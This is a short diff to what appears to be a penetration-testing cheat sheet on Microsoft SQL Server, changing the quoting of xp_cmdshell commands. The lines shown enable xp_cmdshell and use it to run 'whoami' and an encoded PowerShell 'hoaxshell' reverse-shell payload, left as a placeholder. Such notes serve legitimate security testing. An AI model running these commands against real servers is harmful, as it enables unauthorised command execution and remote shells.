@@ -151,8 +151,8 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE
 
 --  Execution de commande (after enabling it)
-xp_cmdshell 'whoami';
-xp_cmdshell 'powershell -e <hoaxshell payload>';
+xp_cmdshell whoami
+xp_cmdshell "powershell -e <hoaxshell payload>";
 ```
 
 #### Capture de Hash
